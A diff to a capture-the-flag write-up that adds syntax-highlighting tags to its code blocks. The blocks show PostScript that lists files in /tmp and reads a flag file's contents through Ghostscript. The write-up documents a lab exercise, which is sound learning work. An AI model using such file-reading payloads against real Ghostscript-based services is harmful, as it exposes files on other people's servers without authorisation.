@@ -533,14 +533,14 @@ So, we need to craft a ghostscript file that can read files in `/tmp`, and then 
 
 For each file in `/tmp`, we call `showfilename`:
 
-```
+```postscript
 % Use filenameforall to list files in /tmp
 (/tmp/*) { showfilename } 1024 string filenameforall
 ```
 
 Then, in `showfilename` we simply display the filename:
 
-```
+```postscript
 % Define a procedure to show filenames
 /showfilename {
     /Helvetica findfont 10 scalefont setfont
@@ -556,14 +556,14 @@ We edit our script to show the contents of the file.
 
 > Note that I was actually surprised this gave the flag, I would have thought the flag file to have a different name at each run, but it wasn't the case.
 
-```
+```postscript
 (/tmp/flag-9fb215456edeadc855c755846be83cc310a5d262aa5d9360dd27db9cd0141a9d.txt)
  (r) file 1024 string readstring
 ```
 
 This is the full script:
 
-```
+```postscript
 %!PS
 /Helvetica findfont 12 scalefont setfont
 100 700 moveto
